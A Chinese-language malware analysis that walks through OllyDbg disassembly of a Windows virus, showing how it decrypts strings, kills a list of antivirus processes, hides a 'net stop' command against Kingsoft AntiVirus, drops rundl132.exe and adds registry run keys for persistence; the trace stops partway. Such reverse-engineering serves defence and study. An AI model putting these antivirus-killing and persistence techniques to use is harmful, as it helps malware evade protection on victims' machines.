
# 反汇编分析

`00407354    E8 3FBEFFFF     call    00403198`

`00407359    C3              retn`

//`call    00404CC0`这个是解密函数，负责将乱码解密

//`call    00407560`这个函数是关闭指定进程的一段代码，先用`ProcessFirst`,`Processnext`,`CreateToolhelp32snapshot`等进程快照函数列举有

没有以下进程：

`0012FDD8   009A0FD0  ASCII "mcshield.exe"`

`0012FDDC   009A1084  ASCII "RavMon.exe"`

`0012FDE0   009A1170  ASCII "regsvc.exe"`

`0012FDE4   009A1290  ASCII "Ravmond.EXE"`

`0012FDE8   009A01CC  ASCII "IPARMOR.EXE"`

`0012FDEC   009A0364  ASCII "KAVPFW.EXE"`

`0012FDF0   009A053C  ASCII "MAILMON.EXE"`

`0012FDF4   009A09C0  ASCII "EGHOST.EXE"`

`0012FDF8   009A0950  ASCII "RavMonClass"`

`0012FDFC   009A08E4  ASCII "RavMon.exe"`

有就用 `OpenProcess`,`TerminateProcess`函数关闭之。

```
00408BAD    8D55 F8         lea     edx, dword ptr [ebp-8]
00408BB0    B8 588C4000     mov     eax, 00408C58                    ; ASCII "酥惋钬挟素?
00408BB5    E8 06C1FFFF     call    00404CC0
00408BBA    8B45 F8         mov     eax, dword ptr [ebp-8]           ;  "KVMonXP.KXP
00408BBD    E8 9EE9FFFF     call    00407560
00408BC2    8D55 F4         lea     edx, dword ptr [ebp-C]
00408BC5    B8 6C8C4000     mov     eax, 00408C6C                    ; ASCII "艘彗砒??"
00408BCA    E8 F1C0FFFF     call    00404CC0
00408BCF    8B45 F4         mov     eax, dword ptr [ebp-C]           ; "KRegEx.exe"
00408BD2    E8 89E9FFFF     call    00407560
00408BD7    8D55 F0         lea     edx, dword ptr [ebp-10]
00408BDA    B8 808C4000     mov     eax, 00408C80                    ; ASCII "酥匦?匦"
00408BDF    E8 DCC0FFFF     call    00404CC0
00408BE4    8B45 F0         mov     eax, dword ptr [ebp-10]          ; "KVXP.KXP"
00408BE7    E8 74E9FFFF     call    00407560
00408BEC    6A 00           push    0
00408BEE    8D55 EC         lea     edx, dword ptr [ebp-14]
00408BF1    B8 948C4000     mov     eax, 00408C94
00408BF6    E8 C5C0FFFF     call    00404CC0
00408BFB    8B45 EC         mov     eax, dword ptr [ebp-14]          ;  "net stop ""Kingsoft AntiVirus Service""
00408BFE    E8 05A9FFFF     call    00403508
00408C03    50              push    eax
00408C04    E8 33B8FFFF     call    0040443C                         ; jmp 到 kernel32.WinExec
00408C09    8D45 FC         lea     eax, dword ptr [ebp-4]
00408C0C    50              push    eax
00408C0D    6A 00           push    0
00408C0F    6A 00           push    0
00408C11    68 008B4000     push    00408B00
00408C16    6A 00           push    0
00408C18    6A 00           push    0
00408C1A    E8 55B6FFFF     call    00404274                         ; jmp 到 kernel32.CreateThread
```

//这里同上，并且执行了`WinExec("net stop ""Kingsoft AntiVirus Service"",SW_HIDE")`

//创建了一个线程

```
0040856B    64:8920         mov     dword ptr fs:[eax], esp
0040856E    8D45 F4         lea     eax, dword ptr [ebp-C]
00408571    E8 2EF9FFFF     call    00407EA4                         ; 取系统目录
00408576    8B55 F4         mov     edx, dword ptr [ebp-C]
00408579    8D45 FC         lea     eax, dword ptr [ebp-4]
0040857C    B9 6C864000     mov     ecx, 0040866C                    ; ASCII "uninstall\"
00408581    E8 CEADFFFF     call    00403354                         ; 连接
00408586    8B45 FC         mov     eax, dword ptr [ebp-4]
00408589    E8 72C5FFFF     call    00404B00
0040858E    84C0            test    al, al
00408590    75 10           jnz     short 004085A2
00408592    6A 00           push    0
00408594    8B45 FC         mov     eax, dword ptr [ebp-4]
00408597    E8 6CAFFFFF     call    00403508
0040859C    50              push    eax
0040859D    E8 B2BCFFFF     call    00404254                         ; jmp 到 kernel32.CreateDirectoryA
004085A2    8D55 F0         lea     edx, dword ptr [ebp-10]
004085A5    B8 80864000     mov     eax, 00408680
004085AA    E8 11C7FFFF     call    00404CC0
004085AF    8B55 F0         mov     edx, dword ptr [ebp-10]          ; "rundl132.exe"
004085B2    8D45 FC         lea     eax, dword ptr [ebp-4]
004085B5    E8 56ADFFFF     call    00403310
004085BA    8B45 FC         mov     eax, dword ptr [ebp-4]           ; C:\WINDOWS\uninstall\rundl132.exe
004085BD    E8 12C3FFFF     call    004048D4                         ; 进去就知道是creaefilea
004085C2    8BD8            mov     ebx, eax
004085C4    83FB FF         cmp     ebx, -1                          ；创建失败？
004085C7    74 1E           je      short 004085E7
004085C9    6A 00           push    0
004085CB    8D45 F8         lea     eax, dword ptr [ebp-8]
004085CE    50              push    eax
004085CF    A1 A0294100     mov     eax, dword ptr [4129A0]
004085D4    50              push    eax
004085D5    A1 94294100     mov     eax, dword ptr [412994]
004085DA    50              push    eax
004085DB    53              push    ebx
004085DC    E8 63BEFFFF     call    00404444                         ; jmp 到 kernel32.WriteFile
004085E1    53              push    ebx
004085E2    E8 55BCFFFF     call    0040423C                         ; jmp 到 kernel32.CloseHandle
004085E7    8B45 FC         mov     eax, dword ptr [ebp-4]           ; C:\WINDOWS\uninstall\rundl132.exe
004085EA    E8 85C4FFFF     call    00404A74
004085EF    84C0            test    al, al
004085F1    74 41           je      short 00408634
004085F3    8B45 FC         mov     eax, dword ptr [ebp-4]
004085F6    E8 0DAFFFFF     call    00403508
004085FB    50              push    eax
004085FC    8D55 EC         lea     edx, dword ptr [ebp-14]
004085FF    B8 98864000     mov     eax, 00408698                    ; ASCII "祜徜"
00408604    E8 B7C6FFFF     call    00404CC0
00408609    8B45 EC         mov     eax, dword ptr [ebp-14]          ; load
0040860C    E8 F7AEFFFF     call    00403508
00408611    50              push    eax
00408612    8D55 E8         lea     edx, dword ptr [ebp-18]
00408615    B8 A8864000     mov     eax, 004086A8
0040861A    E8 A1C6FFFF     call    00404CC0
0040861F    8B45 E8         mov     eax, dword ptr [ebp-18]          ;  "Software\Microsoft\Windows\CurrentVersion\Run")
00408622    E8 E1AEFFFF     call    00403508                         ; 写注册表
```

===================================================================================================================

## 总结一

到这里，我知道了程序读取前面的`E501`字节内容写入到`C:\WINDOWS\uninstall\rundl132.exe`文件当中，并添加到注册表的启动项目当中。

`HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows`

`load=???`

?

这个应该也是对应`rundl132.exe`的

同时程序结束掉常见的杀毒软件，关闭了`Kingsoft AntiVirus Service`这个服务。。

创建的线程`00408B00`，跟到那发现有`winmm.waveOutSetVolume`等函数 ，（我的ＭＰ３突然变成静音了，是不是这几个函数在作怪？呵呵．．）以及用`FindWindow`查找`avp.exe`,用`SendMessage`关闭的代码。。。

继续跟着哦od走，来到这里：

```
00407F2F    E8 50CBFFFF     call    00404A84                         ; 打开自身文件
00407F34    8BF0            mov     esi, eax
00407F36    83FE FF         cmp     esi, -1
00407F39    0F84 E1030000   je      00408320                         ; 失败？
00407F3F    6A 00           push    0
00407F41    56              push    esi
00407F42    E8 C5C3FFFF     call    0040430C                         ; jmp 到 kernel32.GetFileSize
00407F47    3B05 A0294100   cmp     eax, dword ptr [4129A0]          ; 文件大小-E501
00407F4D    0F9FC3          setg    bl
00407F50    84DB            test    bl, bl
00407F52    0F84 C2030000   je      0040831A
00407F58    8D95 64FDFFFF   lea     edx, dword ptr [ebp-29C]
00407F5E    B8 64834000     mov     eax, 00408364                    ; ASCII "??"
00407F63    E8 58CDFFFF     call    00404CC0
00407F68    8B85 64FDFFFF   mov     eax, dword ptr [ebp-29C]         ; ".EXE"
00407F6E    50              push    eax
00407F6F    8D95 60FDFFFF   lea     edx, dword ptr [ebp-2A0]
00407F75    33C0            xor     eax, eax
00407F77    E8 A0A7FFFF     call    0040271C
00407F7C    8B95 60FDFFFF   mov     edx, dword ptr [ebp-2A0]
00407F82    8D45 EC         lea     eax, dword ptr [ebp-14]
00407F85    59              pop     ecx
00407F86    E8 C9B3FFFF     call    00403354
00407F8B    8B45 EC         mov     eax, dword ptr [ebp-14]
00407F8E    E8 75B5FFFF     call    00403508
```
